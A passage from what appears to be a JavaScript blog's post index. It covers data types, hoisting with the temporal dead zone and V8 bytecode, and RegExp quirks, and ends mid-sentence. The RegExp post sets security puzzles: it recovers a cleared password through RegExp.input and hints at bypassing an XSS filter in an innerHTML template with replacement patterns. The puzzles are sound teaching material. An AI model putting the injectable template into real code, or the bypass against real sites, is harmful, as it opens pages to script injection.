Symbol value. All String and Symbol values, including the empty String, are valid as property keys. A property name is a property key that is a String value. Property keys are used to access properties and their values(p.89) An object is a collection of properties, and the “key value” mentioned in the second paragraph is actually the key we often talk about, used to obtain the value of a property. From the spec, we can also see some interesting things, such as the fact that the key of an object must be a string or a symbol. This means that if you use a number as a key, it is actually a string behind the scenes: var obj = &#123; 1: 'abc', &#125; console.log(obj[1]) // abc console.log(obj['1']) // abc And an empty string can also be used as a key, which is valid: var obj = &#123; '': 123 &#125; console.log(obj['']) // 123 Objects are a very important concept in JavaScript, so there will be several articles discussing object-related things later. I believe everyone has heard of a saying that there are two types of data types in JavaScript: primitive data types and objects. Basically, all types except objects are primitive data types. However, in the ECMAScript spec, the term “primitive data type” does not appear, only “primitive values” appear, for example: A primitive value is a member of one of the following built-in types: Undefined, Null, Boolean, Number, BigInt, String, and Symbol; an object is a member of the built-in type Object; (p.49) The term “primitive type” does appear, but only once: If an object is capable of converting to more than one primitive type, it may use the optional hint preferredType to favour that type (p.112) The term “primitive data type” appears most frequently on the Internet in Java, although it does not appear in the JavaScript spec, and “primitive data type” or “primitive type” is not formally defined (only primitive value is formally defined), but it seems reasonable to call the data type that represents primitive value as primitive data type. Anyway, these are just some terms. I just want to supplement the text in the spec. When using it in daily life, I think it is okay to say primitive data type. SummaryThe following are the eight different data types mentioned in the current ECMAScript 2021 spec: Undefined Null Boolean String Symbol Number BigInt Object I briefly introduced each type and some small knowledge seen from the spec, and made a more complete introduction to the Symbol type. After reading these, I am curious about a question, that is, when will there be a ninth type? If so, what is most likely to be? I checked the proposals of TC39 and found that there is currently only one proposal in stage 1 that may add a primitive data type, called BigDecimal, which is used to handle decimals, just like the naming in Java. Although this proposal is still in the early stage, I think it is indeed possible to be adopted in the future. After all, JavaScript currently needs to handle decimals accurately, and it still relies on various third-party libraries, just like handling large numbers in the past. If there is native API support, it would be great, but there is still a long way to go.","link":"/2022/02/26/en/javascript-how-many-types/"},{"title":"I know you understand hoisting, but how deep do you know?","text":"PrefaceSupplement on June 9, 2021: Thanks to the reader blackr1234 for leaving a comment. This article was published in November 2018, and the output results of the code below are probably based on Node.js v8.17.0, so the output of some situations may be different from now. For example, accessing the let variable before declaration, the result at that time was: ReferenceError: a is not defined, and the result using Node.js v14 now is: ReferenceError: Cannot access &#39;a&#39; before initialization. Recently, I have been busy with some teaching-related things, and after preparing some materials, I taught my students about hoisting in JavaScript, which is the concept of “lifting”. For example, the following code: console.log(a) var a = 10 will output undefined instead of ReferenceError: a is not defined. This phenomenon is called Hoisting, and the declaration of the variable is “lifted” to the top. If you only want to understand the basics of hoisting, it’s almost like this, but later I also taught some knowledge related to let and const. However, the day before I just finished teaching, the next day I immediately saw a related technical article and found that I had taught it wrong. Therefore, I spent some time planning to understand hoisting well. Many things may not seem like much before you delve into them. You will find that you still have a lot of concepts that you don’t understand when you really jump in and look deeply. Many people know hoisting, but the degree of understanding is different. I have listed 10 items. If you don’t know any of them, congratulations, this article should bring you some gains. You know what hoisting is You know that hoisting only lifts declarations, not assignments You know the priority of hoisting when function declarations, function parameters, and general variable declarations appear at the same time You know that let and const do not have hoisting You know that the fourth point is wrong, in fact, there is hoisting, but the expression is different You know that there is a concept called TDZ (Temporal Dead Zone) related to the fifth point You have read the ES3 specification and know how it is described inside You have read the ES6 specification and know how it is described inside You know the principle behind hoisting You have seen the code compiled by V8 You may ask, “Why do I need to know so deeply? What’s the use?” In fact, I also think that for hoisting, it is enough to know the basics. As long as you declare variables properly, even if you don’t know those, it will not have much impact on daily life or work. But if you, like me, want to put “proficient in JavaScript” on your resume one day, you cannot escape these things. At the same time, if you are more familiar with these underlying details, you will encounter fewer problems, and you will also understand why hoisting appears. When you want to go further and climb higher on the technical road, I think these details are very important. Next, let’s take a look at hoisting step by step! What is hoisting?In JavaScript, if you try to get the value of a variable that has not been declared, the following error will occur: console.log(a) // ReferenceError: a is not defined It will return an error of a is not defined because you have not declared this variable, so JavaScript cannot find where this variable is, and naturally throws an error. But if you write like this, something magical happens: console.log(a) // undefined var a Since we learned programming, we have learned a concept, “the program runs line by line”. Since it runs line by line, when it reaches the first line, isn’t the variable a not declared yet? Then why doesn’t it throw an error of a is not defined, but outputs undefined? This phenomenon is called hoisting, which is lifted. The var a in the second line is “lifted” to the top for some reason, so you can “imagine” the above code like this: var a console.log(a) // undefined I will emphasize “imagine” because the position of the code will not be moved, so don’t think of hoisting as JavaScript engine helping you “move” all variable declarations to the top, which is problematic. Its principle has nothing to do with moving code. Next, there is one thing to pay special attention to, which is that only variable declarations will be hoisted, not assignments. Take a look at the following example: console.log(a) // undefined var a = 5 You can “imagine” the above code as follows: var a console.log(a) // undefined a = 5 You can split the sentence var a = 5 into two steps. The first step is to declare the variable: var a, and the second step is to assign the value: a = 5. Only the variable declaration in the first step will be hoisted, not the assignment in the second step. At this point, you may think it’s okay, just a little confused. Congratulations, there will be more things to make you even more confused later. Let’s add a few more things and see how complex it can get. If we do it like this, what will be output? function test(v)&#123; console.log(v) var v = 3 &#125; test(10) Simply put, according to what we just learned, we can transform the above code into the following form: function test(v)&#123; var v console.log(v) v = 3 &#125; test(10) The answer is undefined! Easy peasy. But wait, the answer is 10 instead of undefined. In fact, the transformation process is correct, but one factor was overlooked: the passed-in parameter. After adding this factor, it can be seen as follows: function test(v)&#123; var v = 10 // 因為下面呼叫 test(10) var v console.log(v) v = 3 &#125; test(10) At this point, you may still ask, “But didn’t I redeclare the variable before logging and not give it a value? Won’t it be overwritten as undefined?” Let’s look at a simple example: var v = 5 var v console.log(v) The answer will be 5 instead of undefined. To understand this behavior, you can think back to splitting a sentence into two parts, declaration and assignment. If we split it like this and add hoisting, the above code can actually be imagined as follows: var v var v v = 5 console.log(v) Now you know why the answer is 5. At this point, you may feel like your head is about to explode. Why do you have to remember so many rules? Don’t worry, we have one last example that is guaranteed to make you scream. console.log(a) //[Function: a] var a function a()&#123;&#125; In addition to variable declarations, function declarations will also be hoisted and have higher priority. Therefore, the above code will output function instead of undefined. Okay, the basic concept of hoisting ends here. Let me summarize the key points for you: Both variable declarations and function declarations will be hoisted. Only declarations will be hoisted, not assignments. Don’t forget that there are parameters in functions. Don’t worry, we haven’t talked about the new let and const added in ES6 yet. Hoisting with let and constIn ES6, we have two new keywords for declaring variables, let and const. The behavior of these two keywords with hoisting is similar, so I will only use let as an example below. Take a look at the following code: console.log(a) // ReferenceError: a is not defined let a Thank goodness, there are finally not so many rules to remember! From the above code, it seems that let and const do not have variable hoisting, otherwise this error would not be thrown. I used to think so naively, until I saw the following example: var a = 10 function test()&#123; console.log(a) let a &#125; test() If let really doesn’t have hoisting, the answer should output 10, because the log line will access the variable var a = 10 outside. But!!! The answer is: ReferenceError: a is not defined. This means that it did hoist, but the behavior after hoisting is different from var, so at first glance, you might think it didn’t hoist. We will explain this concept in detail later, but before that, let’s make a simple summary. There are many articles that mention hoisting, and they mostly talk about the behavior of hoisting and the differences between let and const. But I think it’s a pity to only talk about it to this extent. Because if you only understand to this extent, you will think that hoisting is just a bunch of complicated rules to remember, and it’s not a big deal. Who can remember so many rules? It’s just memorization, right? This is because the above only lets you understand the “surface” and gives a few different examples to tell you that such behavior will occur, but it does not tell you “why it will happen” or “how it actually works”. If you really want to understand what hoisting is, you must find the answers to the following two questions. Once you find them, I guarantee that your two main veins will be unblocked: Why do we need hoisting? How does hoisting actually work? Why do we need hoisting?When asking such a question, you can think of it the other way around: “What if we don’t have hoisting?” First, we must declare variables before we can use them. This is actually a good practice. Secondly, we must declare the function before we can use it. This is not very convenient, as we may have to put the function declaration at the top of each file to ensure that the code below can call these functions. Thirdly, it is impossible to achieve mutual function calls. For example: (omittedCodeBlock-7b50ff) We call logEvenOrOdd inside the loop, and we also call loop inside logEvenOrOdd. If we don’t have hoisting, the above code cannot be achieved because you cannot simultaneously achieve A on top of B while B is on top of A. So why do we need hoisting? It is to solve the above problem. To add to the correctness of this statement, I quote an article for everyone to read. In Note 4. Two words about “hoisting”. the author mentioned that he raised the topic on Twitter and mentioned mutual recursion as one of the reasons for hoisting. Brendan Eich also acknowledged that FDs hoisting is “for mutual recursion &amp; generally to avoid painful bottom-up ML-like order”. If you want to see the complete conversation screenshot, you can read this article: JavaScript series: variable hoisting and function hoisting, which is attached at the bottom. How does hoisting work?Now that we know what hoisting is and why we need it, the last missing piece of the puzzle is how hoisting works. The best way to answer this question is to look at the ECMAScript specification. Just like when you want to study type conversion problems today, the solution is to look at the specification. The reason is simple because those rules are clearly written on it. ECMAScript has many versions, and the later versions have more specifications. Therefore, for convenience, we use ES3 as an example below. If you have read the rules of ES3, you will find that you cannot find anything related to hoisting as a keyword, and the paragraph related to this phenomenon is actually in Chapter 10: Execution Contexts. Here is a very brief introduction to what Execution Contexts (EC) are. Whenever you enter a function, an EC is generated, which stores some information related to this function and puts this EC into the stack. When the function is executed, the EC is popped out. The schematic diagram is roughly like this, remember that in addition to the EC of the function, there is also a global EC: (Source: https://medium.freecodecamp.org/lets-learn-javascript-closures-66feb44f6a44) In short, all the information needed by the function will exist in the EC, which is the execution environment. You can get everything you need from there. ECMAScript describes it as follows: When control is transferred to ECMAScript executable code, control is entering an execution context. Active execution contexts logically form a stack. The top execution context on this logical stack is the running execution context. The key point is in 10.1.3 Variable Instantiation: Every execution context has associated with it a variable object. Variables and functions declared in the source text are added as properties of the variable object. For function code, parameters are added as properties of the variable object. Each EC has a corresponding variable object (VO for short), in which the variables and functions declared will be added to the VO. If it is a function, the parameters will also be added to the VO. First, you can think of VO as just a JavaScript object. Next, when will VO be used? You will use it when accessing values. For example, in the statement var a = 10, it can be divided into two parts: var a: add a property called “a” to VO (if there is no property called “a”) and initialize it to undefined. a = 10: find the property called “a” in VO and set it to 10. (What if it cannot find the property in VO? It will continuously search through the scope chain. If it cannot find it in any layer, an error will be thrown. Although the process of searching and creating the scope chain is related to this article, it is too much to explain. It is better to write another article separately, so I won’t mention it here.) Next, let’s look at the next paragraph: Which object is used as the variable object and what attributes are used for the properties depends on the type of code, but the remainder of the behaviour is generic. On entering an execution context, the properties are bound to the variable object in the following order: The most essential sentence is “On entering an execution context, the properties are bound to the variable object in the following order”. When entering an EC, things will be put into VO in the following order: The next paragraph is a bit long, so I’ll quote part of it: For function code: for each formal parameter, as defined in the FormalParameterList, create a property of the variable object whose name is the Identifier and whose attributes are determined by the type of code. The values of the parameters are supplied by the caller as arguments to [[Call]]. If the caller supplies fewer parameter values than there are formal parameters, the extra formal parameters have value undefined. In short, for parameters, they will be directly added to VO. If some parameters do not have values, their values will be initialized to undefined. For example, if my function looks like this: function test(a, b, c) &#123;&#125; test(10) Then my VO will look like this: &#123; a: 10, b: undefined, c: undefined &#125; So parameters are the first priority, and then we look at the second one: For each FunctionDeclaration in the code, in source text order, create a property of the variable object whose name is the Identifier in the FunctionDeclaration, whose value is the result returned by creating a Function object as described in 13, and whose attributes are determined by the type of code. If the variable object already has a property with this name, replace its value and attributes. Semantically, this step must follow the creation of FormalParameterList properties. For function declarations, a property will also be added to VO. As for the value, it is the result returned after creating the function (you can think of it as a pointer to the function). Next is the key point: “If there is already an attribute with the same name in VO, overwrite it.” Here’s a small example: function test(a)&#123; function a()&#123;&#125; &#125; test(1) The VO will look like this, and the original parameter a is overwritten: &#123; a: function a &#125; Now let’s take a look at how variable declarations should be handled: For each VariableDeclaration or VariableDeclarationNoIn in the code, create a property of the variable object whose name is the Identifier in the VariableDeclaration or VariableDeclarationNoIn, whose value is undefined and whose attributes are determined by the type of code. If there is already a property of the variable object with the name of a declared variable, the value of the property and its attributes are not changed. Semantically, this step must follow the creation of the FormalParameterList and FunctionDeclaration properties. In particular, if a declared variable has the same name as a declared function or formal parameter, the variable declaration does not disturb the existing property. For variables, a new property is added to the VO with a value of undefined, and here’s the key point: “If the VO already has this property, the value will not be changed.” To summarize, when we enter an EC (you can think of it as executing a function, but before running the code inside the function), we do the following three things in order: Put the parameters in the VO and set the values. Whatever is passed in is what it is, and if there is no value, it is set to undefined. Put the function declaration in the VO, overwriting it if there is already one with the same name. Put the variable declaration in the VO, ignoring it if there is already one with the same name. After reading and understanding the specification, you can use this theory to explain the code we saw earlier: function test(v)&#123; console.log(v) var v = 3 &#125; test(10) You can think of each function as having two stages of execution. The first stage is entering the EC, and the second stage is actually executing the code line by line. When entering the EC, the VO is created. Since there are parameters passed in, v is put into the VO and its value is set to 10. Next, for the variable declaration inside, the VO already has the property v, so it is ignored. Therefore, the VO looks like this: &#123; v: 10 &#125; After the VO is created, the code is executed line by line. This is why the second log prints 10, because at that time, the value of v in the VO was indeed 10. If you change the code to this: function test(v)&#123; console.log(v) var v = 3 console.log(v) &#125; test(10) Then the second log will print 3, because after executing the third line, the value in the VO is changed to 3. The above is the execution process mentioned in the ES3 specification. If you remember this execution process, you don’t have to be afraid of any hoisting-related questions. Just follow the method in the specification to run it correctly. After understanding this execution process, my first feeling was that everything became clear, and hoisting was no longer a mysterious thing. You just need to pretend that you are a JS engine and follow the process. My second feeling was, how does JS achieve this? Compilation and Interpretation: How does the JS engine work?Do you remember when I mentioned earlier that when I was learning programming, there was always a concept that “interpretation” meant that the program was executed line by line, and as a language that was interpreted, shouldn’t JS also be executed line by line? But if it really runs line by line, how can it achieve the hoisting function? It’s impossible to know what line n + 1 is when you execute line n, so it’s impossible to hoist. I searched the internet for a long time for an answer to this question, and finally found an article that I think is quite reasonable: Virtual Machine Talk (1): Interpreter, Tree Traversal Interpreter, Stack-Based and Register-Based, Hodgepodge. There are a few points mentioned in the article that I think are very well written and have dispelled many of my previous misconceptions: First, languages generally only define abstract semantics and do not enforce a specific implementation method. For example, we say that C is a compiled language, but C also has an interpreter. So when we say that a certain programming language is interpreted or compiled, we are actually referring to “most” rather than all. In other words, when we say that JavaScript is an interpreted language, it does not mean that JavaScript cannot have a compiler, and vice versa. Second, the biggest difference between an interpreter and a compiler is “execution”. The compilation step is simply to compile the source code A into the target code B, but you need to ensure that the results of executing A and B are the same. Interpretation is when you input the source code A, and the output is directly the semantics that you want to execute in your code. How it is done inside is a black box. There is a good picture in the original article: So there can also be compilation inside an interpreter, and this is not conflicting. Or you can write a super simple interpreter that compiles your source code and then executes it. In fact, many types of interpreters operate by first compiling the source code into some intermediate code before executing it, so the compilation step is still very common, and JS also works this way. When you abandon the old concept of “JS must be executed line by line” and embrace the idea that “actually mainstream JS engines have a compilation step”, you will not think that hoisting is an impossible thing to achieve. As we have seen in the specification, we know the operating mode in ES3 and know about VO, but what the specification describes is only abstract, and it does not say where the processing is actually done, and this place is actually the compilation phase. Speaking of the issue of compilation and interpretation, I have been stuck for a long time because there are many incorrect concepts in the past. Now I am slowly correcting them, and for hoisting, I actually had some confusion before about the difference between the specification and the implementation. Later, I even went to ask the author of You-Dont-Know-JS and was lucky enough to get a reply. Interested people can take a look: https://github.com/getify/You-Dont-Know-JS/issues/1375. Operation of JS engineAs I mentioned above, mainstream JS engines now have a compilation phase, and hoisting is actually processed during this phase. With the introduction of the compilation phase, JS can be divided into two steps: compilation phase and execution phase. During the compilation phase, all variable and function declarations are processed and added to the scope, and they can be used during execution. This article explains it very well: Hoisting in JavaScript, and I will just modify the code inside as an example. For example, I have this piece of code: var foo = \"bar\" var a = 1 function bar() &#123; foo = \"inside bar\" var a = 2 c = 3 console.log(c) console.log(d) &#125; bar() During the compilation phase, the declaration part is processed, so it will be like this: Line 1：global scope，我要宣告一個變數叫做 foo Line 2：global scope，我要宣告一個變數叫做 a Line 3：global scope，我要宣告一個函式叫做 bar Line 4：沒有任何變數宣告，不做事 Line 5：bar scope，我要宣告一個變數叫做 a Line 6：沒有任何變數宣告，不做事 Line 7：沒有任何變數宣告，不做事 Line 8：沒有任何變數宣告，不做事 After processing, it looks like this: globalScope: &#123; foo: undefined, a: undefined, bar: function &#125; barScope: &#123; a: undefined &#125; Next, enter the execution phase. There are two proprietary terms to remember before introducing them. It is better to understand them with an example: var a = 10 console.log(a) There is a difference between these two lines. When we write the first line, we only need to know “where is the memory location of a”, and we don’t care what its value is. The second line is “we only care about its value, give me the value”, so even though both lines have a, you can see that what they want to do is different. We call the a in the first line an LHS (Left hand side) reference, and the a in the second line an RHS (Right hand side) reference. The left and right here refer to the left and right sides relative to the equal sign, but this way of understanding is not precise enough, so it is better to remember it like this: LHS: Please help me find the location of this variable because I want to assign a value to it.RHS: Please help me find the value of this variable because I want to use this value. With this concept, let’s take a look at the example code above step by step: var foo = \"bar\" var a = 1 function bar() &#123; foo = \"inside bar\" var a = 2 c = 3 console.log(c) console.log(d) &#125; bar() Line 1: var foo &#x3D; “bar”JS engine: global scope, do I have an LHS reference to foo here?Execution result: The scope says yes, so it successfully finds foo and assigns a value to it. The global scope at this time: &#123; foo: \"bar\", a: undefined, bar: function &#125; Line 2: var a &#x3D; 1JS Engine: Global scope, do I have an LHS reference to a? Have you seen it?Execution result: Scope says yes, so it successfully finds a and assigns it a value. The global scope at this point: &#123; foo: \"bar\", a: 1, bar: function &#125; Line 10: bar()JS Engine: Global scope, do I have an RHS reference to bar? Have you seen it?Execution result: Scope says yes, so it successfully returns the value of bar and calls the function. Line 4: foo &#x3D; “inside bar”JS Engine: Bar scope, do I have an LHS reference to foo? Have you seen it?Execution result: Bar scope says no, so it goes to the previous global scope.JS Engine: Global scope, do I have an LHS reference to foo? Have you seen it?Execution result: Yes, so it successfully finds foo and assigns it a value. The global scope at this point: &#123; foo: \"inside bar\", a: 1, bar: function &#125; Line 5: var a &#x3D; 2JS Engine: Bar scope, do I have an LHS reference to a? Have you seen it?Execution result: Bar scope says yes, so it successfully finds a and assigns it a value. The bar scope at this point: &#123; a: 2 &#125; Line 6: c &#x3D; 3JS Engine: Bar scope, do I have an LHS reference to c? Have you seen it?Execution result: Bar scope says no, so it goes to the previous global scope.JS Engine: Global scope, do I have an LHS reference to c? Have you seen it?Execution result: No. At this point, there are several possible outcomes. If you are in strict mode (use strict), it will return a ReferenceError: c is not defined error. If you are not in strict mode, the global scope will add c and set it to 3. Here, we assume that we are not in strict mode. The global scope at this point: &#123; foo: \"inside bar\", a: 1, bar: function, c: 3 &#125; Line 7: console.log(c)JS Engine: Bar scope, do I have an RHS reference to c? Have you seen it?Execution result: Bar scope says no, so it goes to the previous global scope.JS Engine: Global scope, do I have an RHS reference to c? Have you seen it?Execution result: Yes, so it successfully returns the value of c and calls console.log. Line 8: console.log(d)JS Engine: Bar scope, do I have an RHS reference to d? Have you seen it?Execution result: Bar scope says no, so it goes to the previous global scope.JS Engine: Global scope, do I have an RHS reference to d? Have you seen it?Execution result: No, so it returns an error ReferenceError: d is not defined. The above is the working process of the JS engine. For more detailed information, please refer to: You Don’t Know JS: Scope &amp; Closures, Chapter 4: Hoisting, Hoisting in JavaScript. SummaryLet’s review the ten items we mentioned at the beginning: Do you know what hoisting is? Do you know that hoisting only hoists declarations, not assignments? Do you know the hoisting priority when function declarations, function parameters, and variable declarations appear together? Do you know that let and const do not have hoisting? Do you know that the fourth item is wrong and that they do have hoisting, but the form is different? Do you know that there is a concept called TDZ (Temporal Dead Zone) related to the fifth item? Have you read the ES3 specification and know how it is described? Have you read the ES6 specification and know how it is described? Do you know the principle behind hoisting? Have you seen the code compiled by V8? We have covered all seven points in great detail, and what’s left is: You know about the concept of TDZ (Temporal Dead Zone) related to the sixth point. You have seen how it is described in the ES6 specification. You have seen the code compiled by V8. I don’t plan to go into detail about the ES6 specification (and I haven’t read it in detail yet), because there are still many changes, but the basic principles remain the same. It’s just that there are some proprietary terms added. If you want to know more, you can refer to this classic article: ECMA-262-5 in detail. Chapter 3.2. Lexical environments: ECMAScript implementation.. We have already covered a lot of things related to hoisting, and all the mechanisms related to hoisting have been explained. However, I believe it will still take some time to absorb all of this. But I believe that after you have absorbed it, you will feel refreshed and realize that hoisting is not that complicated. Next, we will move on to the last part of this article, which is TDZ and V8. Temporal Dead ZoneDo you remember that we said let and const actually have hoisting? And we gave a small example to verify this. Let and const do have hoisting. The difference between them and var is that after hoisting, the variable declared by var is initialized to undefined, while the declaration of let and const is not initialized to undefined. And if you try to access it before “assignment”, an error will be thrown. During the “period” after hoisting and before “assignment”, if you try to access it, an error will be thrown. This period is called the TDZ, which is a term proposed to explain the hoisting behavior of let and const. We use the following code as an example: function test() &#123; var a = 1; // c 的 TDZ 開始 var b = 2; console.log(c) // 錯誤 if (a > 1) &#123; console.log(a) &#125; let c = 10 // c 的 TDZ 結束 &#125; test() If you try to access c before line 8 is executed, an error will be thrown. Note that TDZ is not a spatial concept, but a temporal one. For example, in the following code: function test() &#123; yo() // c 的 TDZ 開始 let c = 10 // c 的 TDZ 結束 function yo()&#123; console.log(c) &#125; &#125; test() When you enter the test function, c is already in the TDZ, so when you execute yo and execute console.log(c), you are still in the TDZ, and you have to wait until let c = 10 is executed to end the TDZ. So it’s not that putting console.log(c) below let c = 10 solves the problem, but that it needs to be executed later in the “execution order”. Or you can ignore these terms and summarize it in one sentence: Let and const also have hoisting, but they are not initialized to undefined, and an error will be thrown if you try to access them before assignment. Byte code reading experienceSince we talked about the JS engine above, it would be a pity not to talk about V8. When I was studying hoisting, I always wanted to know one thing: what does the code compiled by V8 look like? Thanks to this wonderful article Understanding V8’s Bytecode, we can try to compile the code into byte code using node.js and try to interpret it. Before we start, let’s introduce what byte code is. It is a language between high-level languages and machine code. It is not as easy to understand as high-level languages, but it is much easier to understand than machine code, and it is more efficient to execute. The following figure explains the relationship between them very clearly: Next, we use this simple function as an example to see what it looks like after compilation: function funcA() &#123; var a = 10 console.log(a) &#125; funcA() Although there is only one function, there will still be a lot of things when running with node.js, so we put the result into a file first: node --print-bytecode test.js &gt; byte_code.txt The compiled result looks like this: [generating bytecode for function: funcA] Parameter count 1 Frame size 24 76 E> 0xeefa4feb062 @ 0 : 91 StackCheck 93 S> 0xeefa4feb063 @ 1 : 03 0a LdaSmi [10] 0xeefa4feb065 @ 3 : 1e fb Star r0 100 S> 0xeefa4feb067 @ 5 : 0a 00 02 LdaGlobal [0], [2] 0xeefa4feb06a @ 8 : 1e f9 Star r2 108 E> 0xeefa4feb06c @ 10 : 20 f9 01 04 LdaNamedProperty r2, [1], [4] 0xeefa4feb070 @ 14 : 1e fa Star r1 108 E> 0xeefa4feb072 @ 16 : 4c fa f9 fb 00 CallProperty1 r1, r2, r0, [0] 0xeefa4feb077 @ 21 : 04 LdaUndefined 115 S> 0xeefa4feb078 @ 22 : 95 Return Constant pool (size = 2) Handler Table (size = 16) We clear some of the information at the beginning and add comments to let you know what the above code means (I don’t really understand it, and there seems to be little information on this aspect. Please correct me if I’m wrong): StackCheck LdaSmi [10] // 把 10 放到 accumulator 裡面 Star r0 // 把 accumulator 的值放到 r0 裡，所以 r0 = 10 LdaGlobal [0], [2] // 載入一個 Global 的東西到 acc 裡 Star r2 // 把它存到 r2，根據後見之明，r2 應該就是 console LdaNamedProperty r2, [1], [4] // 載入一個 r2 的 Property（應該就是 log） Star r1 // 把它存到 r1，也就是 r1 = console.log CallProperty1 r1, r2, r0, [0] // console.log.call(console, 10) LdaUndefined // 把 undefined 放到 acc Return // return undefined Then we reverse the order to look like this: function funcA() &#123; console.log(a) var a = 10 &#125; funcA() Let’s take a look at what the output byte code looks like. Before explaining, you can compare it with the previous one to see the difference: StackCheck LdaGlobal [0], [2] // 載入一個 Global 的東西到 acc 裡 Star r2 // 把它存到 r2，根據後見之明，r2 應該就是 console LdaNamedProperty r2, [1], [4] // 載入一個 r2 的 Property（應該就是 log） Star r1 // 把它存到 r1，也就是 r1 = console.log CallProperty1 r1, r2, r0, [0] // console.log.call(console, undefined) LdaSmi [10] // 把 10 放到 accumulator 裡面 Star r0 // 把 accumulator 的值放到 r0 裡，所以 r0 = 10 LdaUndefined // 把 undefined 放到 acc Return // return undefined Actually, the only difference is that the order has been changed, and r0 is directly logged in the output. I’m not sure if r0 was originally undefined or if it was initialized as undefined elsewhere. Next, let’s see what happens if we try to print an undeclared variable: function funcA() &#123; console.log(b) var a = 10 &#125; funcA() Because most of the code is duplicated from before, I won’t comment on it again: StackCheck LdaGlobal [0], [2] Star r2 LdaNamedProperty r2, [1], [4] Star r1 LdaGlobal [2], [6] // 試圖載入 b 的值，出錯 Star r3 CallProperty1 r1, r2, r3, [0] LdaSmi [10] Star r0 LdaUndefined Return The key point of the whole paragraph is only the line LdaGlobal, which seems to be loading the value of b. It should be this line that causes the error during execution because b cannot be found in the global scope. After reading the basics, let’s see what let is compiled into: function funcA() &#123; console.log(a) let a = 10 &#125; funcA() The compiled result: LdaTheHole // 把 hole 載入到 acc 去 Star r0 // r0 = hole StackCheck LdaGlobal [0], [2] Star r2 // r2 = console LdaNamedProperty r2, [1], [4] Star r1 // r1 = console.log Ldar r0 // 載入 r0 ThrowReferenceErrorIfHole [2] // 拋出錯誤 CallProperty1 r1, r2, r0, [0] // console.log.call(console, r0) LdaSmi [10] Star r0 LdaUndefined Return You will see a mysterious thing called a hole, which is actually what we call the TDZ. That’s why there is a line ThrowReferenceErrorIfHole, which means that if we try to access the value of this hole before the TDZ ends, an error will be thrown. So far, we have explained how the TDZ actually works during the compilation phase, using this special thing called a hole. ConclusionRecently, I have been trying to fill in some of my basic knowledge of JavaScript. If I hadn’t read two articles, 解读ECMAScript[1]——执行环境、作用域及闭包 and JS 作用域, I probably wouldn’t have written this article. Several points that are frequently tested in JavaScript are well-known: this, prototype, closure, and hoisting. These seemingly unrelated things can be somewhat connected if you can understand the underlying operating model of JavaScript, forming a complete theory. I also mentioned in the article that the process of explaining the execution environment can be supplemented to explain closures. You will find that many things can actually be integrated. If I have the opportunity in the future, I will turn this into a series and break down those concepts in JavaScript that you think are difficult but actually aren’t. Before writing this article, I had been brewing it for about a month, constantly looking for information, digesting it, and transforming it into my own understanding. I am also very grateful to the author of the JS scope article and the author of YDKJS for patiently answering my questions. Finally, I hope this article is helpful to you. If there are any errors, please let me know. Thank you. References: MDN: Hoisting ECMA-262-3 in detail. Chapter 2. Variable object. JS 作用域 JavaScript Optimization Patterns (Part 2) danbev&#x2F;learning-v8 Why is there a “temporal dead zone” in ES6? exploringjs: Variables and scoping # 由阮一峰老师的一条微博引发的 TDZ 思考 理解ES6中的暂时死区(TDZ) TEMPORAL DEAD ZONE (TDZ) DEMYSTIFIED MDN: let Grokking V8 closures for fun (and profit?) 解读ECMAScript[1]——执行环境、作用域及闭包","link":"/2018/11/10/en/javascript-hoisting-and-tdz/"},{"title":"The Magical Features of RegExp and String Replacement in JavaScript","text":"It’s a blog post about a few magical features that I have encountered recently. It is not interesting to say it directly. Let’s start with a few small challenges: Challenge 1Guess what is the result of the code below? var regexp = /huli/g var str = 'blog.huli.tw' var str2 = 'example.huli.tw' console.log(regexp.test(str)) // ??? console.log(regexp.test(str2)) // ??? Challenge 2First let you enter a password, and then let you run some JavaScript, can you get the password that has been removed? var password = prompt('input password') while (!/^[a-zA-Z0-9]+$/.test(password)) &#123; console.log('invalid password') password = prompt('input password') &#125; password = '' // If you can dynamically execute the code below, can you get the password? eval(prompt('try to get password')) Challenge 3Will something go wrong with the code below? What is it? var tmpl = '&lt;input type=\"submit\" value=\"&#123;&#123;value&#125;&#125;\">' var value = prompt('your payload') value = value.replace(/[>\"]/g, '') tmpl = tmpl.replace('&#123;&#123;value&#125;&#125;', value) document.body.innerHTML = tmpl Stateful RegExpGuess what is the result of the code below? var regexp = /huli/g var str = 'blog.huli.tw' var str2 = 'example.huli.tw' console.log(regexp.test(str)) // ??? console.log(regexp.test(str2)) // ??? Whoever looks at it will think both are true, right? But the answer is true and false. Even if you write it like this, the second is still false: var regexp = /huli/g var str = 'blog.huli.tw' console.log(regexp.test(str)) // true console.log(regexp.test(str)) // false It’s because of RegExp is stateful, as long as there is a global or sticky flag. RegExp has an attribute called lastIndex, which will record the position of the last match. The next time test is used, it will start from lastIndex. If not found, lastIndex will automatically reset to zero. var regexp = /huli/g var str = 'blog.huli.tw' console.log(regexp.test(str)) // true console.log(regexp.lastIndex) // 9, because str[5..8] === 'huli' console.log(regexp.test(str)) // false console.log(regexp.lastIndex) // 0, reset to zero because not found console.log(regexp.test(str)) // true, because lastIndex was reset to 0 console.log(regexp.lastIndex) // 9 So, according to the featue of lastIndex , this looks fine at first glance: var regexp = /huli/g var str = 'huli.tw' var str2 = 'blog.huli.tw' console.log(regexp.test(str)) // true console.log(regexp.test(str2)) // true But that doesn’t mean there are no bugs. The reason why the above code seems to be no problem is because lastIndex is 4 after first match, and the position where huli appears in str2 starts from 5, so it can be found as well. If the last two lines are swaped, it will produce unexpected results. Anyway, be careful with this feature when using global RegExp. As a security engineer, we can pay attention to these potential bugs and see if there is anything that can be exploited. The Magical Property of RegExpContinuing the small challenge at the beginning: var password = prompt('input password') while (!/^[a-zA-Z0-9]+$/.test(password)) &#123; console.log('invalid password') password = prompt('input password') &#125; password = '' eval(prompt('try to get password')) The variable password has been cleared, so we can’t access the value from prompt. Fair enough, but that’s not true. we can get it via a magical property on RegExp called RegExp.input, this property will record the input for the last match of regepx.test(): /hello/.test('hello world') console.log(RegExp.input) // hello world console.log(RegExp.$_) // same as above In addition to this, other parameters are also logged: RegExp.lastMatch ($&amp;) RegExp.lastParen ($+) RegExp.leftContext ($&amp;#x60;) RegExp.rightContext ($’) I learned about this trick at DiceCTF 2022 - web&#x2F;nocookies Special Variables for RegExpIn the challenge 3, we gave the following code: var tmpl = '&lt;input type=\"submit\" value=\"&#123;&#123;value&#125;&#125;\">' var value = prompt('your payload') value = value.replace(/[>\"]/g, '') tmpl = tmpl.replace('&#123;&#123;value&#125;&#125;', value) document.body.innerHTML = tmpl The double quotes have been filtered out, so there should be no way to escape the attribute, and &gt; has also been removed, so there is no way to close the tag. However, when doing string replacement, there is something called: special replacement patterns. For example, $&amp;#x60; can get the “front” of the place where the string is replaced, 